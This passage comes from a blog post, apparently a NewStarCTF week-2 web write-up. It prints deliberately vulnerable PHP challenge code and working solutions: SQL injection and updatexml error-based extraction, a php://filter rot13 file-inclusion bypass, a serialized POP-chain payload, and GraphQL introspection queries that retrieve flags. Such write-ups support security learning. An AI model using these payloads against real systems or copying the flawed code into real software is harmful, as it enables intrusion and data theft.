class=\"number\">4</span>:<span class=\"string\">&quot;eeee&quot;</span>:<span class=\"number\">1</span>:&#123;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;obj&quot;</span>;O:<span class=\"number\">5</span>:<span class=\"string\">&quot;Start&quot;</span>:<span class=\"number\">2</span>:&#123;s:<span class=\"number\">4</span>:<span class=\"string\">&quot;name&quot;</span>;O:<span class=\"number\">3</span>:<span class=\"string\">&quot;Sec&quot;</span>:<span class=\"number\">2</span>:&#123;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;obj&quot;</span>;O:<span class=\"number\">4</span>:<span class=\"string\">&quot;Easy&quot;</span>:<span class=\"number\">1</span>:&#123;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;cla&quot;</span>;N;&#125;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;var&quot;</span>;r:<span class=\"number\">1</span>;&#125;s:<span class=\"number\">4</span>:<span class=\"string\">&quot;func&quot;</span>;O:<span class=\"number\">3</span>:<span class=\"string\">&quot;Sec&quot;</span>:<span class=\"number\">2</span>:&#123;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;obj&quot;</span>;O:<span class=\"number\">4</span>:<span class=\"string\">&quot;Easy&quot;</span>:<span class=\"number\">1</span>:&#123;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;cla&quot;</span>;N;&#125;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;var&quot;</span>;N;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"4-ezAPI\"><a href=\"#4-ezAPI\" class=\"headerlink\" title=\"4.ezAPI\"></a>4.ezAPI</h2><p><a class=\"link\"   href=\"http://www.zip/\" >www.zip<i class=\"fas fa-external-link-alt\"></i></a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">    &lt;body&gt;</span><br><span class=\"line\">        &lt;center&gt;</span><br><span class=\"line\">            &lt;h1&gt;Search Page&lt;/h1&gt;&lt;br&gt;</span><br><span class=\"line\">            &lt;hr&gt;&lt;br&gt;</span><br><span class=\"line\">            &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class=\"line\">            ID: </span><br><span class=\"line\">            &lt;input type=&quot;text&quot; name=&quot;id&quot;&gt;</span><br><span class=\"line\">            &lt;input type=&quot;submit&quot; value=&quot;Search&quot;&gt;</span><br><span class=\"line\">            &lt;/form&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">$id = $_POST[&#x27;id&#x27;];</span><br><span class=\"line\">function waf($str)&#123;</span><br><span class=\"line\">    if(!is_numeric($str) || preg_replace(&quot;/[0-9]/&quot;,&quot;&quot;,$str) !== &quot;&quot;)&#123;#False,</span><br><span class=\"line\">        return False;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        return True;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function send($data)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $options = array(</span><br><span class=\"line\">        &#x27;http&#x27; =&gt; array(</span><br><span class=\"line\">            &#x27;method&#x27; =&gt; &#x27;POST&#x27;,</span><br><span class=\"line\">            &#x27;header&#x27; =&gt; &#x27;Content-type: application/json&#x27;,</span><br><span class=\"line\">            &#x27;content&#x27; =&gt; $data,</span><br><span class=\"line\">            &#x27;timeout&#x27; =&gt; 10 * 60</span><br><span class=\"line\">        )</span><br><span class=\"line\">    );</span><br><span class=\"line\">    $context = stream_context_create($options);</span><br><span class=\"line\">    $result = file_get_contents(&quot;http://graphql:8080/v1/graphql&quot;, false, $context);</span><br><span class=\"line\">    return $result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($id))&#123;</span><br><span class=\"line\">    if(waf($id))&#123;</span><br><span class=\"line\">        isset($_POST[&#x27;data&#x27;]) ? $data=$_POST[&#x27;data&#x27;] : $data=&#x27;&#123;&quot;query&quot;:&quot;query&#123;\\nusers_user_by_pk(id:&#x27;.$id.&#x27;) &#123;\\nname\\n&#125;\\n&#125;\\n&quot;, &quot;variables&quot;:null&#125;&#x27;;</span><br><span class=\"line\">        $res = json_decode(send($data));</span><br><span class=\"line\">        if($res-&gt;data-&gt;users_user_by_pk-&gt;name !== NULL)&#123;</span><br><span class=\"line\">            echo &quot;ID: &quot;.$id.&quot;&lt;br&gt;Name: &quot;.$res-&gt;data-&gt;users_user_by_pk-&gt;name;</span><br><span class=\"line\">        &#125;else&#123;</span><br><span class=\"line\">            echo &quot;&lt;b&gt;Can&#x27;t found it!&lt;/b&gt;&lt;br&gt;DEBUG: &quot;;</span><br><span class=\"line\">            var_dump($res-&gt;data);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        die(&quot;&lt;b&gt;Hacker!&lt;/b&gt;&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    die(&quot;&lt;b&gt;No Data?&lt;/b&gt;&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;/center&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>graphQL</p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/wy_97/article/details/110522150\" >https://blog.csdn.net/wy_97/article/details/110522150<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>postdatagraphQLapi</p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1&amp;data=&#123;&quot;query&quot;:&quot;query&#123;\\n  __schema &#123;\\n  types &#123;\\n name  \\n &#125;\\n&#125;\\n&#125;\\n&quot;, &quot;variables&quot;:null&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161702655.png\"\n                        alt=\"-1665405825041\"\n                 ></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1&amp;data=&#123;&quot;query&quot;:&quot;query&#123;ffffllllaaagggg_1n_h3r3_flag &#123;flag&#125;&#125;&quot;,&quot;variables&quot;:null&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;4a902c8e-a8b5-ecfb-bee3-d6419865647c&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"NewStarCTF-WEEK2-WEB\"><a href=\"#NewStarCTF-WEEK2-WEB\" class=\"headerlink\" title=\"NewStarCTF WEEK2 WEB\"></a>NewStarCTF WEEK2 WEB</h1><h2 id=\"1-Word-For-You-2-Gen\"><a href=\"#1-Word-For-You-2-Gen\" class=\"headerlink\" title=\"1.Word-For-You(2 Gen)\"></a>1.Word-For-You(2 Gen)</h2><p></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span><span class=\"string\">&#x27; or 1=1#</span></span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161701146.png\"\n                        alt=\"-1665405773483\"\n                 ></p>\n<p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161701158.png\"\n                        alt=\"-1665405782381\"\n                 ></p>\n<p>~wfy</p>\n<p></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">XPATH syntax error: <span class=\"string\">&#x27;~wfy_admin,wfy_comments,wfy_info&#x27;</span>    </span><br></pre></td></tr></table></figure>\n\n<p>flagwfy_comments</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span><span class=\"operator\">||</span>updatexml(<span class=\"number\">1</span>,concat(<span class=\"number\">0x7e</span>,(<span class=\"keyword\">select</span> reverse(group_concat(text)) <span class=\"keyword\">from</span> wfy_comments)),<span class=\"number\">1</span>)#</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">XPATH syntax error: <span class=\"string\">&#x27;~&#125;sr0rre_emos_ek2m_t4uJ&#123;galf,&#x27;</span>    <span class=\"operator\">/</span><span class=\"operator\">/</span>flag</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"2-IncludeOne\"><a href=\"#2-IncludeOne\" class=\"headerlink\" title=\"2.IncludeOne\"></a>2.IncludeOne</h2><p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&quot;seed.php&quot;</span>);</span><br><span class=\"line\"><span class=\"comment\">//mt_srand(*********);//</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;Hint: &quot;</span>.<span class=\"title function_ invoke__\">mt_rand</span>().<span class=\"string\">&quot;&lt;br&gt;&quot;</span>;<span class=\"comment\">//1219893521</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;guess&#x27;</span>]) &amp;&amp; <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;guess&#x27;</span>]) === <span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">mt_rand</span>()))&#123;<span class=\"comment\">//md5</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/base|\\.\\./i&quot;</span>,<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]) &amp;&amp;<span class=\"comment\">//base preg_match(&quot;/NewStar/i&quot;,$_GET[&#x27;file&#x27;]) &amp;&amp; isset($_GET[&#x27;file&#x27;]))&#123;</span></span><br><span class=\"line\">       <span class=\"comment\">//NewStarfile</span></span><br><span class=\"line\">        <span class=\"comment\">//flag in `flag.php`</span></span><br><span class=\"line\">        <span class=\"keyword\">include</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]);<span class=\"comment\">//</span></span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Baby Hacker?&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;No Hacker!&quot;</span>;</span><br><span class=\"line\">&#125; Hint: <span class=\"number\">1219893521</span></span><br><span class=\"line\">No Hacker!</span><br></pre></td></tr></table></figure>\n\n<p><a class=\"link\"   href=\"https://www.openwall.com/php_mt_seed/\" >https://www.openwall.com/php_mt_seed/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p></p>\n<p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">mt_srand</span>(<span class=\"number\">12345</span>);    </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">mt_rand</span>().<span class=\"string\">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">mt_rand</span>().<span class=\"string\">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">mt_rand</span>().<span class=\"string\">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">mt_rand</span>().<span class=\"string\">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">mt_rand</span>().<span class=\"string\">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span>    </span><br><span class=\"line\"><span class=\"number\">162946439</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">247161732</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">1463094264</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">1878061366</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">394962642</span></span><br></pre></td></tr></table></figure>\n\n<p>12345</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161702046.png\"\n                        alt=\"-1665405798622\"\n                 ></p>\n<p>1145146</p>\n<p>1202031004</p>\n<p>post</p>\n<p>baserot13</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php:<span class=\"comment\">//filter/read=string.rot13/resource=flag.php</span></span><br></pre></td></tr></table></figure>\n\n<p>NewStar</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php:<span class=\"comment\">//filter/NewStar/read=string.rot13/resource=flag.php</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">synt&#123;p1786p1p-rqr8-4524-n796-r3s84050oo92&#125;</span><br></pre></td></tr></table></figure>\n\n<p>rot13</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;c1786c1c-ede8-4524-a796-e3f84050bb92&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"3-UnserializeOne\"><a href=\"#3-UnserializeOne\" class=\"headerlink\" title=\"3.UnserializeOne\"></a>3.UnserializeOne</h2><p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"comment\">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Start</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$func</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Welcome to NewStarCTF, &quot;</span>.<span class=\"variable language_\">$this</span>-&gt;name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__isset</span>(<span class=\"params\"><span class=\"variable\">$var</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        (<span class=\"variable language_\">$this</span>-&gt;func)();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Sec</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$obj</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$var</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;obj-&gt;<span class=\"title function_ invoke__\">check</span>(<span class=\"variable\">$this</span>-&gt;<span class=\"keyword\">var</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;CTFers&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;/flag&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Easy</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$cla</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$fun</span>, <span class=\"variable\">$var</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;cla = <span class=\"keyword\">clone</span> <span class=\"variable\">$var</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">eeee</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$obj</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__clone</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable language_\">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;success&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;pop&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;pop&#x27;</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;/flag&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><input checked=\"\" disabled=\"\" type=\"checkbox\"> __construct()</li>\n<li>__destruct()</li>\n<li>__call()</li>\n<li>__callStatic()</li>\n<li>__get()</li>\n<li>__set()</li>\n<li>__isset()isset()empty()</li>\n<li>__unset()unset()</li>\n<li>__sleep()serialize()</li>\n<li>__wakeup()unserialize()</li>\n<li>__toString()</li>\n<li>__invoke()</li>\n<li>__set_state()var_export()</li>\n<li>__clone()</li>\n<li>__autoload()</li>\n<li>__debugInfo()</li>\n</ul>\n<p>pop**__destruct<strong>Sec</strong>__invoke**</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Welcome to NewStarCTF, &quot;</span>.<span class=\"variable language_\">$this</span>-&gt;name;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>nameecho**__tostring**</p>\n<p>StartnameSec</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;obj-&gt;<span class=\"title function_ invoke__\">check</span>(<span class=\"variable\">$this</span>-&gt;<span class=\"keyword\">var</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;CTFers&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>check**__call**</p>\n<p>SecobjEasy</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$fun</span>, <span class=\"variable\">$var</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;cla = <span class=\"keyword\">clone</span> <span class=\"variable\">$var</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>Easyclaeeee**__clone**</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span 